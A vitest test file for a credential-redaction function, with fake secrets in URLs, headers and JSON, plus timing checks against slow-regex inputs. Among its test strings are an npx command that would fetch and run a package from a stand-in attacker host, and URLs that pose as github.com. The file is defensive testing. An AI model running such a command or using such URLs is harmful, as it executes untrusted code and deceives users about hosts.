// M-07: credentials never reach a report. Each row is a hostile text and the exact text that may be printed. The secret words are
// made up (`s3cr3t-fake`), and every row is also checked for the rule "the secret is not in the output".
import { describe, expect, it } from 'vitest';
import { REDACTED, REDACTED_URL, needsRedaction, redact } from '#shared/domain/redaction/redact.ts';
import { redactDeep } from '#shared/domain/redaction/redactDeep.ts';

const hidden = REDACTED;

type Row = [title: string, input: string, output: string, secret: string];

const rows: Row[] = [
  [
    'user and password in an https URL',
    'https://vinh:s3cr3t-fake@example.invalid/kb-g.git',
    `https://${hidden}@example.invalid/kb-g.git`,
    's3cr3t-fake',
  ],
  [
    'a user name alone',
    'https://s3cr3t-fake@example.invalid/kb-g.git',
    `https://${hidden}@example.invalid/kb-g.git`,
    's3cr3t-fake',
  ],
  ['an ssh user, which is hidden too', 'ssh://git@github.com/o/r.git', `ssh://${hidden}@github.com/o/r.git`, ''],
  [
    'a password with a raw at sign',
    'https://u:p@ss-s3cr3t@example.invalid/x.git',
    `https://${hidden}@example.invalid/x.git`,
    's3cr3t',
  ],
  [
    'a password with a raw slash, which makes the whole address unreadable',
    'https://u:pa/s3cr3t@example.invalid/x.git',
    REDACTED_URL,
    's3cr3t',
  ],
  ['upper-case scheme', 'HTTPS://u:s3cr3t@example.invalid/x', `HTTPS://${hidden}@example.invalid/x`, 's3cr3t'],
  [
    'a URL inside a git error text',
    "fatal: unable to access 'https://u:s3cr3t@example.invalid/x.git/': 403",
    `fatal: unable to access 'https://${hidden}@example.invalid/x.git/': 403`,
    's3cr3t',
  ],
  [
    'token query',
    'https://example.invalid/x.git?token=s3cr3t',
    `https://example.invalid/x.git?token=${hidden}`,
    's3cr3t',
  ],
  [
    'access_token after another parameter',
    'https://example.invalid/x?ref=main&access_token=s3cr3t&b=1',
    `https://example.invalid/x?ref=main&access_token=${hidden}&b=1`,
    's3cr3t',
  ],
  ['upper-case TOKEN', 'https://example.invalid/x?TOKEN=s3cr3t', `https://example.invalid/x?TOKEN=${hidden}`, 's3cr3t'],
  [
    'a percent-encoded parameter name',
    'https://example.invalid/x?%74oken=s3cr3t',
    `https://example.invalid/x?%74oken=${hidden}`,
    's3cr3t',
  ],
  [
    'a parameter that holds a password',
    'https://example.invalid/x?password=s3cr3t',
    `https://example.invalid/x?password=${hidden}`,
    's3cr3t',
  ],
  [
    'an api key and a signature',
    'https://e.invalid/x?api_key=s3cr3t&sig=s3cr3t2',
    `https://e.invalid/x?api_key=${hidden}&sig=${hidden}`,
    's3cr3t',
  ],
  [
    'a token in the fragment',
    'https://example.invalid/x#access_token=s3cr3t',
    `https://example.invalid/x#access_token=${hidden}`,
    's3cr3t',
  ],
  [
    'a GitHub personal access token',
    'remote: bad credentials ghp_AbCd1234s3cr3tXyZ',
    `remote: bad credentials ${hidden}`,
    's3cr3t',
  ],
  ['a GitHub fine-grained token', 'token github_pat_11ABC_s3cr3t used', `token ${hidden} used`, 's3cr3t'],
  ['a GitHub app token', 'gho_s3cr3t and ghs_s3cr3t', `${hidden} and ${hidden}`, 's3cr3t'],
  ['a GitLab token', 'glpat-s3cr3t_x-y', hidden, 's3cr3t'],
  ['a bearer header', 'Authorization: Bearer abcdef-s3cr3t-123', `Authorization: ${hidden}`, 's3cr3t'],
  ['a bearer word alone', 'sent Bearer s3cr3t-token-123 now', `sent Bearer ${hidden} now`, 's3cr3t'],
  ['a basic authorization header', 'authorization: Basic dXNlcjpzM2NyM3Q=', `authorization: ${hidden}`, 'dXNlcjpz'],
];

const moreRows: Row[] = [
  [
    'a backslash that ends the authority, as some parsers read it',
    'https://evil.example\\@github.com/o/r',
    REDACTED_URL,
    'evil.example',
  ],
  ['a backslash before the path', 'https://u:s3cr3t\\@h.invalid/x', REDACTED_URL, 's3cr3t'],
  [
    'an npx command whose package is a URL with an at sign in the path',
    'npx -y https://attacker.example/evil-mcp@latest',
    `npx -y ${REDACTED_URL}`,
    'attacker',
  ],
  [
    'an at sign in the path that poses as another host',
    'https://attacker.example/x@github.com/o/r.git',
    REDACTED_URL,
    'attacker',
  ],
  ['an at sign in the query', 'https://h.invalid/x?next=a@b.invalid', REDACTED_URL, 'next=a'],
  ['an at sign after a hash', 'https://h.invalid/x#frag@b.invalid', REDACTED_URL, 'frag'],
  ['a password with a hash before the at sign', 'https://u:pa#s3cr3t@h.invalid/x', REDACTED_URL, 's3cr3t'],
  ['a password with a quote', "https://u:pa'ss-s3cr3t@h.invalid/x", `https://${hidden}@h.invalid/x`, 's3cr3t'],
  ['a scheme that follows letters', 'xhttps://u:s3cr3t@h.invalid/x', `xhttps://${hidden}@h.invalid/x`, 's3cr3t'],
  ['a URL in brackets', '(https://u:s3cr3t@h.invalid/x)', `(https://${hidden}@h.invalid/x)`, 's3cr3t'],
  [
    'two URLs in one word, where an at sign follows the first authority',
    'a=https://u:s3cr3t@h.invalid/x,b=https://v:s3cr3t2@h.invalid/y',
    `a=${REDACTED_URL}`,
    's3cr3t',
  ],
  [
    'a quoted Authorization key in JSON',
    '{"Authorization": "Basic dXNlcjpzM2NyM3Q="}',
    `{"Authorization": "${hidden}"}`,
    'dXNlcjpz',
  ],
  [
    'a single-quoted authorization key',
    "{'authorization': 'Bearer abcdef-s3cr3t-123'}",
    `{'authorization': '${hidden}'}`,
    's3cr3t',
  ],
  [
    'an authorization assignment with a quoted value',
    'authorization="Token s3cr3t"',
    `authorization="${hidden}"`,
    's3cr3t',
  ],
  ['a JSON member named token', '{"token":"s3cr3t","name":"kb"}', `{"token":"${hidden}","name":"kb"}`, 's3cr3t'],
  [
    'a JSON member named client_secret, with an escape',
    '{"client_secret": "s3cr3t\\"x"}',
    `{"client_secret": "${hidden}"}`,
    's3cr3t',
  ],
  ['a JSON member named password', '{"user":"u","password":"s3cr3t"}', `{"user":"u","password":"${hidden}"}`, 's3cr3t'],
];

describe('M-07 redact', () => {
  it.each([...rows, ...moreRows])('hides %s', (_title, input, output, secret) => {
    const result = redact(input);
    expect(result).toBe(output);
    if (secret !== '') expect(result).not.toContain(secret);
  });

  it.each([...rows, ...moreRows])('is stable when applied twice: %s', (_title, input) => {
    expect(redact(redact(input))).toBe(redact(input));
  });

  it.each([
    ['plain text', 'component kb: git https://github.com/o/r.git main at 3f2a9c1d0e7b'],
    ['a harmless parameter', 'https://example.invalid/x?ref=main&depth=1'],
    ['a store path with an at sign', '/home/v/.agent-config/store/kb@9a41c0d2e7f1/index.md'],
    ['a variable assignment', 'satisfy: set OTS_REPOS_ROOT=<value>'],
    ['an already hidden text', `https://${hidden}@example.invalid/x?token=${hidden}`],
    ['the word token in prose', 'the token is missing'],
    ['a short prefix word', 'ghp_'],
    ['a GitHub address', 'https://github.com/o/r.git'],
    ['an npx command with a scoped package', 'npx -y @scope/pkg@1.2.3'],
    ['a JSON member that is not a credential', '{"name":"kb","count":3}'],
    ['an e-mail address', 'mail v@example.invalid'],
  ])('leaves %s as it is', (_title, text) => {
    expect(redact(text)).toBe(text);
  });
});

describe('M-07 redactDeep', () => {
  it('redacts every string of a nested report and copies instead of changing the input', () => {
    const input = {
      home: 'https://u:s3cr3t@h.invalid/x',
      needs: [{ item: 'a', suggested: { source: 'https://h.invalid/x?token=s3cr3t' } }],
      count: 3,
      done: true,
      none: null,
    };
    const copy = structuredClone(input);
    const output = redactDeep(input);
    expect(JSON.stringify(output)).not.toContain('s3cr3t');
    expect(output.count).toBe(3);
    expect(output.none).toBeNull();
    expect(input).toEqual(copy);
  });
});

describe('M-01 needsRedaction', () => {
  it.each([
    ['a credential in a URL', 'https://u:s3cr3t@h.invalid/x', true],
    ['a URL with an at sign in the path', 'npx -y https://attacker.example/evil-mcp@latest', true],
    ['plain text', 'node {{AGENT_HOME}}/core/tools/guard.mjs', false],
    ['an already hidden text', `https://${hidden}@h.invalid/x`, false],
  ])('says %s: %s', (_title, text, expected) => {
    expect(needsRedaction(text)).toBe(expected);
  });
});

// M-13: no input makes the redaction slow. Each text is 256 KiB of the shape that would hurt a backtracking expression.
describe('M-13 redact stays linear', () => {
  const size = 256 * 1024;
  const hostile: [title: string, text: string][] = [
    ['one long word', 'a'.repeat(size)],
    ['schemes with no authority', '://'.repeat(size / 3)],
    ['schemes with short authorities', 'a://'.repeat(size / 4)],
    ['at signs after schemes', 'a://a@'.repeat(size / 6)],
    ['separators with no names', '&'.repeat(size)],
    ['long parameter names with no equals sign', `&${'a'.repeat(size - 1)}`],
    ['many parameters', '&a=b'.repeat(size / 4)],
    ['bearer and spaces', `Bearer${' '.repeat(size)}`],
    ['many bearers', 'Bearer '.repeat(size / 7)],
    ['json keys', '"token":'.repeat(size / 8)],
    ['unterminated json value', `{"token": "${'\\\\'.repeat(size / 2)}`],
    ['authorization keys', 'authorization:'.repeat(size / 14)],
    ['prefixes', 'ghp_'.repeat(size / 4)],
  ];

  it.each(hostile)('redacts %s in under 50 ms', (_title, text) => {
    const started = performance.now();
    redact(text);
    expect(performance.now() - started).toBeLessThan(50);
  });
});
